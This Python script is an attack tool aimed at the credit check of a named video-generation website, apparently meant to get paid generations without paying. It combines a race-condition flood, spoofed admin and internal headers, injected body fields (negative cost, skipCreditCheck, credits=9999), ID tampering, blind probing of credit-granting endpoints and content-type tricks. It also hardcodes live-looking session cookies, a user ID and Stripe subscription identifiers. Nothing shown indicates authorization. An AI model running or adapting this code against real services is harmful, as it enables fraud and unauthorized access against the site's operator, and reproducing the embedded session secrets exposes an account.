"""
Backend bypass probe — multi-vector attack on viddo.ai credit check.

Vectors:
  A. Race condition — fire N simultaneous requests before deduction commits (TOCTOU)
  B. Header injection — X-Forwarded-For: 127.0.0.1, X-Admin, X-Internal etc
  C. Negative/zero credit tricks — credits=0, cost=-1, override fields
  D. Subscription ID manipulation — reference a different/higher sub record
  E. Webhook replay — fake a Stripe credits-added event
  F. Direct credit PATCH — try to PATCH site_data record directly
  G. Content-Type tricks — multipart, text/plain, etc to confuse validation
"""

import requests, json, threading, time, sys

BASE = 'https://viddo.ai'
SESSION_TOKEN = 'CiqAykZneKhsNT1S6iRNR75QS6Cj2n2X.g4pzFoA9Mql5aDBC3K+UuqgVTxeoOndb+eTAmGk1GKc='
SESSION_DATA = ('eyJzZXNzaW9uIjp7InNlc3Npb24iOnsiZXhwaXJlc0F0IjoiMjAyNi0wNS0wNVQwNjozNzo1OC41MjRaIiwidG9rZW4iOiJDaXFBeWtabmVLaHNOVDFTNmlSTlI3NVFTNkNqMm4yWCIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsImlwQWRkcmVzcyI6IjExMS45My4xMi4xNDIiLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxNTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNTIuMCIsInVzZXJJZCI6InNYWFZXQUthbWlJQjdlN001WDgzZG5TclRtcFJ1UXo4IiwiaWQiOiJTOVRQVFN4TWFFdUhKQTNmUzRURmJubHdDZmE3WW1hcyJ9LCJ1c2VyIjp7Im5hbWUiOiJhaHk0OEB0ZW1wZWR1bWFpbC5tZSIsImVtYWlsIjoiYWh5NDhAdGVtcGVkdW1haWwubWUiLCJlbWFpbFZlcmlmaWVkIjp0cnVlLCJpbWFnZSI6bnVsbCwiY3JlYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwidXBkYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwiaWQiOiJzWFhWV0FLYW1pSUI3ZTdNNVg4M2RuU3JUbXBSdVF6OCJ9LCJ1cGRhdGVkQXQiOjE3NzczNTg2MTExMzMsInZlcnNpb24iOiIxIn0sImV4cGlyZXNBdCI6MTc3NzM1ODkxMTEzMywic2lnbmF0dXJlIjoidy1vU3BkNG1UTXhMUl9wNHFNc3FVTVhWbkEzc2R5N1lteWNFb3BsT0VzdyJ9')
COOKIES = {'__Secure-better-auth.session_token': SESSION_TOKEN, '__Secure-better-auth.session_data': SESSION_DATA}
BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0',
    'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/json',
    'Referer': 'https://viddo.ai/dashboard', 'Origin': 'https://viddo.ai',
    'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
}

SEED_BODY = {
    'model': 'seedance-2-0', 'channel': 'version2',
    'prompt': 'a wolf in snow', 'aspectRatio': '16:9',
    'quality': '480p', 'duration': 5, 'webSearch': False,
}

def post_gen(headers=None, body=None, label=''):
    h = {**BASE_HEADERS, **(headers or {})}
    b = {**SEED_BODY, **(body or {})}
    try:
        r = requests.post(BASE + '/api/middle-layer', headers=h, cookies=COOKIES, json=b, timeout=20)
        result = f'{r.status_code}: {r.text[:150]}'
    except Exception as e:
        result = f'ERR: {e}'
    print(f'  [{label}] {result}')
    return result

# ══════════════════════════════════════════════
# A. RACE CONDITION (8 simultaneous requests)
# ══════════════════════════════════════════════
print('\n' + '='*50)
print('A. RACE CONDITION — 8 simultaneous requests')
print('='*50)
results_a = []
threads = []
for i in range(8):
    t = threading.Thread(target=lambda i=i: results_a.append(post_gen(label=f'race-{i}')))
    threads.append(t)
# Fire all at once
for t in threads:
    t.start()
for t in threads:
    t.join()
success_a = [r for r in results_a if '402' not in r and '400' not in r and 'error' not in r.lower()]
print(f'  >>> Race successes: {len(success_a)}')

# ══════════════════════════════════════════════
# B. INTERNAL/ADMIN HEADER INJECTION
# ══════════════════════════════════════════════
print('\n' + '='*50)
print('B. HEADER INJECTION')
print('='*50)
header_tests = [
    ({'X-Forwarded-For': '127.0.0.1'}, 'X-FF-localhost'),
    ({'X-Real-IP': '127.0.0.1'}, 'X-Real-localhost'),
    ({'X-Forwarded-For': '10.0.0.1'}, 'X-FF-internal'),
    ({'X-Admin': 'true'}, 'X-Admin-true'),
    ({'X-Internal': 'true'}, 'X-Internal-true'),
    ({'X-Bypass': 'true'}, 'X-Bypass-true'),
    ({'X-Free': 'true'}, 'X-Free-true'),
    ({'X-No-Credits': 'true'}, 'X-No-Credits'),
    ({'X-Override-Credits': '9999'}, 'X-Override-Credits'),
    ({'X-Credits': '9999'}, 'X-Credits-9999'),
    ({'X-User-Role': 'admin'}, 'X-Role-admin'),
    ({'X-User-Plan': 'unlimited'}, 'X-Plan-unlimited'),
    ({'Authorization': 'Bearer admin'}, 'Bearer-admin'),
    ({'X-API-Key': 'internal'}, 'X-API-Key'),
    ({'CF-Connecting-IP': '127.0.0.1'}, 'CF-IP-localhost'),
    ({'X-Vercel-Internal': 'true'}, 'X-Vercel-Internal'),
]
for hdrs, label in header_tests:
    post_gen(headers=hdrs, label=label)

# ══════════════════════════════════════════════
# C. BODY FIELD TRICKS
# ══════════════════════════════════════════════
print('\n' + '='*50)
print('C. BODY FIELD TRICKS')
print('='*50)
body_tests = [
    ({'creditCost': 0}, 'creditCost=0'),
    ({'creditCost': -1}, 'creditCost=-1'),
    ({'credits': 9999}, 'credits=9999'),
    ({'creditsLeft': 9999}, 'creditsLeft=9999'),
    ({'useCredits': 0}, 'useCredits=0'),
    ({'skipCreditCheck': True}, 'skipCreditCheck'),
    ({'noCreditCheck': True}, 'noCreditCheck'),
    ({'ignoreCredits': True}, 'ignoreCredits'),
    ({'deductCredits': False}, 'deductCredits=false'),
    ({'plan': 'unlimited'}, 'plan=unlimited'),
    ({'subscription': 'unlimited'}, 'subscription=unlimited'),
    ({'isAdmin': True}, 'isAdmin=true'),
    ({'userId': 'admin'}, 'userId=admin'),
    ({'internal': True}, 'internal=true'),
    ({'test': True}, 'test=true'),
    ({'demo': True}, 'demo=true'),
    ({'trial': True}, 'trial=true'),
    ({'preview': True}, 'preview=true'),
    ({'promo': True}, 'promo=true'),
    ({'couponCode': 'UNLIMITED'}, 'coupon=UNLIMITED'),
    ({'couponCode': 'FREE100'}, 'coupon=FREE100'),
    ({'discountCode': 'UNLIMITED'}, 'discountCode=UNLIMITED'),
    ({'referralCode': 'pl0ig4'}, 'referralCode'),   # our own referral code
]
for extra_body, label in body_tests:
    post_gen(body=extra_body, label=label)

# ══════════════════════════════════════════════
# D. SUBSCRIPTION ID / PLAN OVERRIDE
# ══════════════════════════════════════════════
print('\n' + '='*50)
print('D. SUBSCRIPTION ID MANIPULATION')
print('='*50)
# Try sending a different subscriptionId — maybe the server validates against any known sub
sub_tests = [
    {'subscriptionId': 'sub_1TJmN2LJjKcnBgiXsU2XJxi1'},   # our own real sub
    {'subscriptionId': 'sub_unlimited'},
    {'subscriptionId': 'sub_free'},
    {'planId': 'price_1T4tl8LJjKcnBgiXD0sp2caM'},           # our real price_id
    {'planId': 'unlimited'},
    {'siteDataId': 454554},                                  # our site_data record id
    {'siteDataId': 1},                                       # id=1 (maybe admin/test record)
    {'siteDataId': 0},
]
for extra_body in sub_tests:
    post_gen(body=extra_body, label=str(extra_body))

# ══════════════════════════════════════════════
# E. DIRECT CREDIT ENDPOINTS
# ══════════════════════════════════════════════
print('\n' + '='*50)
print('E. DIRECT CREDIT ENDPOINTS')
print('='*50)
credit_paths = [
    ('POST', '/api/credits/add', {'amount': 1800}),
    ('POST', '/api/credits/grant', {'credits': 1800}),
    ('POST', '/api/credits/topup', {'amount': 1800}),
    ('POST', '/api/credits/refill', {}),
    ('POST', '/api/credits/reset', {}),
    ('POST', '/api/user/credits', {'credits': 1800}),
    ('PATCH', '/api/user/credits', {'credits_left': 1800}),
    ('PUT', '/api/user/credits', {'credits': 1800}),
    ('POST', '/api/subscription/credits', {'credits': 1800}),
    ('POST', '/api/admin/credits', {'userId': 'sXXVWAKamiIB7e7M5X83dnSrTmpRuQz8', 'credits': 1800}),
    ('POST', '/api/referral/claim', {'code': 'pl0ig4'}),
    ('POST', '/api/affiliate/withdraw', {'amount': 0}),
    ('POST', '/api/coupon/redeem', {'code': 'UNLIMITED'}),
    ('POST', '/api/coupon/apply', {'coupon': 'UNLIMITED'}),
    ('POST', '/api/promo/redeem', {'code': 'FREE'}),
]
for method, path, body in credit_paths:
    try:
        r = requests.request(method, BASE + path, headers=BASE_HEADERS, cookies=COOKIES, json=body, timeout=10)
        if r.status_code not in (404, 405) and '<html' not in r.text[:30]:
            print(f'  [{method} {path}] {r.status_code}: {r.text[:200]}')
        elif r.status_code not in (404, 405):
            print(f'  [{method} {path}] {r.status_code}: (HTML page)')
    except Exception as e:
        pass

# ══════════════════════════════════════════════
# F. CONTENT-TYPE BYPASS
# ══════════════════════════════════════════════
print('\n' + '='*50)
print('F. CONTENT-TYPE BYPASS')
print('='*50)
import urllib.parse
ct_tests = [
    # Send as form-urlencoded instead of JSON — might skip server-side JSON validation
    ('application/x-www-form-urlencoded',
     urllib.parse.urlencode({**SEED_BODY, 'freeMode': 'true'}), 'form-urlencoded'),
    # Double content-type header
    ('application/json; charset=utf-8', json.dumps({**SEED_BODY, 'freeMode': True}), 'json-charset'),
]
for ct, data, label in ct_tests:
    h = {**BASE_HEADERS, 'Content-Type': ct}
    try:
        r = requests.post(BASE + '/api/middle-layer', headers=h, cookies=COOKIES, data=data, timeout=15)
        print(f'  [{label}] {r.status_code}: {r.text[:200]}')
    except Exception as e:
        print(f'  [{label}] ERR: {e}')

print('\nDone.')
